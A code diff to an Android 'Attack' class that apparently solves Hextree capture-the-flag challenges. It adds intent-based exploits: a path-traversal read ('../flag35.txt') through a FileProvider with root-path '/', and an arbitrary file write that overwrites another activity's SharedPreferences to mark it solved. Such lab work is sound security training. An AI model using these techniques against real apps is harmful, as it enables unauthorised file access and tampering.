@@ -239,7 +239,7 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		val intent = Intent().apply {
 			setClassName(packageName, activityPath)
 		}
-		activity.startActivityForResult(intent,9)
+		activity.startActivityForResult(intent, 9)
 	}
 
 	/**
@@ -418,6 +418,80 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 			action = "io.hextree.FLAG33"
 		}
 		activity.startActivityForResult(intent, 331)
+	}
+	/**
+	 * FLAG 34 - Simple File Provider
+	 * Technique: FileProvider URI access via "filename" extra
+	 *
+	 * Flow:
+	 * 1. Launch Flag34Activity with filename="flags/flag34.txt"
+	 * 2. Activity writes the real decrypted flag content into that file on disk
+	 * 3. Returns a content:// URI (via FileProvider) pointing to it, with read+write grant
+	 * 4. We read the file content through the granted URI in onActivityResult()
+	 *
+	 * Key insight: Flag34Activity never calls success() internally - there's no code
+	 * path that marks it "solved" in the app's own UI. Reading the flag text via the
+	 * returned URI IS the complete solve; the app just doesn't tick this one visually.
+	 */
+	fun flag34() {
+		val activityPath = "$packageName.activities.Flag34Activity"
+
+		val intent = Intent().apply {
+			setClassName(packageName, activityPath)
+			putExtra("filename", "flags/flag34.txt")
+		}
+		activity.startActivityForResult(intent, 34)
+	}
+
+	/**
+	 * FLAG 35 - Root-File Provider
+	 * Technique: Path traversal via overly permissive FileProvider root-path config
+	 *
+	 * Flow:
+	 * 1. Launch Flag35Activity with filename="../flag35.txt"
+	 * 2. Its FileProvider authority "io.hextree.root" is configured with root-path="/"
+	 *    (no folder restriction) - so ".." walks outside the intended sandbox
+	 * 3. Activity returns a content:// URI with BOTH read+write grant (flags=3)
+	 * 4. We read the file content through the granted URI in onActivityResult()
+	 *
+	 * Key insight: Unlike Flag34's narrow "flags/" folder restriction, Flag35's
+	 * root-path="/" means the "filename" parameter can traverse to ANY file on the
+	 * filesystem the app's UID can access - this is what makes Flag36 possible too.
+	 */
+	fun flag35() {
+		val activityPath = "$packageName.activities.Flag35Activity"
+
+		val intent = Intent().apply {
+			setClassName(packageName, activityPath)
+			putExtra("filename", "../flag35.txt")
+		}
+		activity.startActivityForResult(intent, 35)
+	}
+
+	/**
+	 * FLAG 36 - Overwriting Shared Prefs
+	 * Technique: Arbitrary file WRITE via Flag35's root-path traversal + write grant
+	 *
+	 * Flow:
+	 * 1. Reuse Flag35Activity (not Flag36Activity) - it's the one with write access
+	 * 2. filename="../shared_prefs/Flag36Preferences.xml" traverses to the real
+	 *    SharedPreferences file backing Flag36Activity's solved check
+	 * 3. Receive the URI with write grant (flags=3, same as Flag35)
+	 * 4. Overwrite the file content to set solved="true" in valid XML shape
+	 * 5. Flag36Activity.onCreate() reads Flag36Preferences.getBoolean("solved") -> success()
+	 *
+	 * Key insight: Flag36Activity itself has NO exploitable vulnerability - it just
+	 * trusts whatever is on disk. The real bug is entirely in Flag35's unrestricted
+	 * write access, which lets us modify a completely different flag's private state.
+	 */
+	fun flag36() {
+		val activityPath = "$packageName.activities.Flag35Activity"
+
+		val intent = Intent().apply {
+			setClassName(packageName, activityPath)
+			putExtra("filename", "../shared_prefs/Flag36Preferences.xml")
+		}
+		activity.startActivityForResult(intent, 36)
 	}
 
 }
